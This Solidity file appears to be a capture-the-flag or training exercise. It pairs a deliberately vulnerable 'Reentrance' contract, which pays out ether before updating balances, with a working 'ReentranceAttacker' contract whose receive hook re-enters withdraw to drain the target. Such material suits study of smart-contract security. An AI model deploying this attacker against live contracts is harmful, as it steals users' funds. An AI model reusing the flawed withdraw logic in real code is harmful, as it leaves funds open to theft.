// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import 'openzeppelin-contracts/math/SafeMath.sol';
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";
import "forge-std/console.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceAttacker{
  Reentrance target;
  uint amt2withdraw = 0.001 ether;
  constructor(address payable _target) public {
    target = Reentrance(_target);
  }

  function attack() external payable {
    require(amt2withdraw == msg.value);
    target.donate{value:amt2withdraw}(address(this));
    target.withdraw(amt2withdraw);
  }

  receive() external payable {
    // console.log("ReentranceAttacker::receive()# entered");
    if(address(target).balance>0){
      // console.log("ReentranceAttacker::receive()# querying");
      target.withdraw(amt2withdraw);
      // console.log("ReentranceAttacker::receive()# after query");
    }
  }
}